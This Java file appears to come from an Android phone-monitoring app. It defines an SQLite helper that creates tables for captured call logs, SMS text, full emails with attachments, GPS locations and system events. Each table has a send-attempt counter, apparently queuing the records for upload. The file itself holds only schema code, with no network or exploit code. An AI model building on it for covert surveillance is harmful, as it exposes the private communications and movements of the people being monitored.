package com.fx.dalvik.eventdb;

import android.content.Context;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import com.fx.dalvik.util.FxLog;

import com.vvt.android.syncmanager.Customization;

public class EventDatabaseHelper extends SQLiteOpenHelper {
	
	private static final String TAG = "DeviceEventDatabaseHelper";
	private static final boolean LOCAL_DEBUG = false;
	private static final boolean LOCAL_LOGV = Customization.DEBUG ? LOCAL_DEBUG : false;
	private static final boolean LOCAL_LOGD = Customization.DEBUG ? LOCAL_DEBUG : false;
	
	private static EventDatabaseHelper mInstance = null;

    static final String DATABASE_NAME = "event.db";
    static final int DATABASE_VERSION = 2;

    static synchronized EventDatabaseHelper getInstance(Context context) {
    	if (mInstance == null) {
    		mInstance = new EventDatabaseHelper(context);
    	}
    	return mInstance;
    }
    
	private EventDatabaseHelper(Context context) {
		super(context, DATABASE_NAME, null, DATABASE_VERSION);
	}

	@Override
	public void onCreate(SQLiteDatabase db) {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "Creating database");
		}
		createCallLogEventTable(db);
		createSmsFxLogEventTable(db);
		createEmailEventTable(db);
		createLocationFxLogEventTable(db);
		createSystemFxLogEventTable(db);
	}

	// Currently, we have no plan for an upgrade so we just drop and recreate all tables
	@Override
	public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
		if (LOCAL_LOGD) {
			FxLog.d(TAG, String.format("Upgrading database from version %1$s to %2$s, " +
					"which will destroy all old data", oldVersion, newVersion));
		}
		// Drop all tables
		db.execSQL(String.format("DROP TABLE IF EXISTS %1$s", EventDatabaseMetadata.Call.TABLE_NAME));
		db.execSQL(String.format("DROP TABLE IF EXISTS %1$s", EventDatabaseMetadata.Sms.TABLE_NAME));
		db.execSQL(String.format("DROP TABLE IF EXISTS %1$s", EventDatabaseMetadata.Email.TABLE_NAME));
		db.execSQL(String.format("DROP TABLE IF EXISTS %1$s", EventDatabaseMetadata.Location.TABLE_NAME));
		db.execSQL(String.format("DROP TABLE IF EXISTS %1$s", EventDatabaseMetadata.System.TABLE_NAME));
		
		// Create all tables
        onCreate(db);
	}
	
	private void createCallLogEventTable(SQLiteDatabase db) {
		String sql = String.format("CREATE TABLE %1$s " +
				"(%2$s INTEGER PRIMARY KEY, " +
				"%3$s NUMERIC, " +
				"%4$s NUMERIC, " +
				"%5$s TEXT, " +
				"%6$s NUMERIC, " +
				"%7$s NUMERIC, " +
				"%8$s NUMERIC, " +
				"%9$s NUMERIC, " +
				"%10$s NUMERIC, " +
				"%11$s NUMERIC, " +
				"%12$s TEXT);"
				, EventDatabaseMetadata.Call.TABLE_NAME // 1
				, EventDatabaseMetadata.ROWID // 2
				, EventDatabaseMetadata.IDENTIFIER // 3
				, EventDatabaseMetadata.SENDATTEMPTS // 4
				, EventDatabaseMetadata.Call.PHONENUMBER // 5
				, EventDatabaseMetadata.Call.TIME_INITIATED // 6
				, EventDatabaseMetadata.Call.DURATION_SECONDS // 7
				, EventDatabaseMetadata.Call.DIRECTION // 8
				, EventDatabaseMetadata.Call.TIME_CONNECTED // 9
				, EventDatabaseMetadata.Call.TIME_TERMINATED // 10
				, EventDatabaseMetadata.Call.STATUS // 11
				, EventDatabaseMetadata.Call.CONTACT_NAME); // 12
		db.execSQL(sql);
	}
	
	private void createSmsFxLogEventTable(SQLiteDatabase db) {
		String sql = String.format("CREATE TABLE %1$s " +
				"(%2$s INTEGER PRIMARY KEY, " +
				"%3$s NUMERIC, " +
				"%4$s NUMERIC, " +
				"%5$s NUMERIC, " +
				"%6$s NUMERIC, " +
				"%7$s TEXT, " +
				"%8$s TEXT, " +
				"%9$s TEXT);"
				, EventDatabaseMetadata.Sms.TABLE_NAME // 1
				, EventDatabaseMetadata.ROWID // 2
				, EventDatabaseMetadata.IDENTIFIER // 3
				, EventDatabaseMetadata.SENDATTEMPTS // 4
				, EventDatabaseMetadata.Sms.TIME // 5
				, EventDatabaseMetadata.Sms.DIRECTION // 6
				, EventDatabaseMetadata.Sms.PHONENUMBER // 7
				, EventDatabaseMetadata.Sms.DATA // 8
				, EventDatabaseMetadata.Sms.CONTACT_NAME); // 9
		db.execSQL(sql);
	}
	
	private void createEmailEventTable(SQLiteDatabase db) {
		String sql = String.format("CREATE TABLE %1$s " +
				"(%2$s INTEGER PRIMARY KEY, " +
				"%3$s NUMERIC, " +
				"%4$s NUMERIC, " +
				"%5$s NUMERIC, " +
				"%6$s NUMERIC, " +
				"%7$s NUMERIC, " +
				"%8$s TEXT, " +
				"%9$s TEXT, " +
				"%10$s TEXT, " +
				"%11$s TEXT, " +
				"%12$s TEXT, " +
				"%13$s TEXT, " +
				"%14$s TEXT, " +
				"%15$s TEXT);"
				, EventDatabaseMetadata.Email.TABLE_NAME // 1
				, EventDatabaseMetadata.ROWID // 2
				, EventDatabaseMetadata.IDENTIFIER // 3
				, EventDatabaseMetadata.SENDATTEMPTS // 4
				, EventDatabaseMetadata.Email.TIME //5
				, EventDatabaseMetadata.Email.DIRECTION //6
				, EventDatabaseMetadata.Email.SIZE //7
				, EventDatabaseMetadata.Email.SENDER //8
				, EventDatabaseMetadata.Email.TO //9
				, EventDatabaseMetadata.Email.CC //10
				, EventDatabaseMetadata.Email.BCC //11
				, EventDatabaseMetadata.Email.SUBJECT //12
				, EventDatabaseMetadata.Email.ATTACHMENTS //13
				, EventDatabaseMetadata.Email.BODY //14
				, EventDatabaseMetadata.Email.CONTACT_NAME);  //15
		db.execSQL(sql);
	}
	
	private void createLocationFxLogEventTable(SQLiteDatabase db) {
		String sql = String.format("CREATE TABLE %1$s " +
				"(%2$s INTEGER PRIMARY KEY, " +
				"%3$s NUMERIC, " +
				"%4$s NUMERIC, " +
				"%5$s NUMERIC, " +
				"%6$s REAL, " +
				"%7$s REAL, " +
				"%8$s REAL, " +
				"%9$s REAL, " +
				"%10$s REAL, " +
				"%11$s TEXT);"
				, EventDatabaseMetadata.Location.TABLE_NAME // 1
				, EventDatabaseMetadata.ROWID // 2
				, EventDatabaseMetadata.IDENTIFIER // 3
				, EventDatabaseMetadata.SENDATTEMPTS // 4
				, EventDatabaseMetadata.Location.TIME // 5
				, EventDatabaseMetadata.Location.LATITUDE // 6
				, EventDatabaseMetadata.Location.LONGITUDE // 7
				, EventDatabaseMetadata.Location.ALTITUDE // 8
				, EventDatabaseMetadata.Location.HORIZONTAL_ACCURACY // 9
				, EventDatabaseMetadata.Location.VERTICAL_ACCURACY // 10
				, EventDatabaseMetadata.Location.PROVIDER); // 11
		db.execSQL(sql);
	}
	
	private void createSystemFxLogEventTable(SQLiteDatabase db) {
		String sql = String.format("CREATE TABLE %1$s " +
				"(%2$s INTEGER PRIMARY KEY, " +
				"%3$s NUMERIC, " +
				"%4$s NUMERIC, " +
				"%5$s NUMERIC, " +
				"%6$s NUMERIC, " +
				"%7$s TEXT);"
				, EventDatabaseMetadata.System.TABLE_NAME // 1
				, EventDatabaseMetadata.ROWID // 2
				, EventDatabaseMetadata.IDENTIFIER // 3
				, EventDatabaseMetadata.SENDATTEMPTS // 4
				, EventDatabaseMetadata.System.TIME // 5
				, EventDatabaseMetadata.System.DIRECTION // 6
				, EventDatabaseMetadata.System.DATA); // 7
		db.execSQL(sql);
	}

}
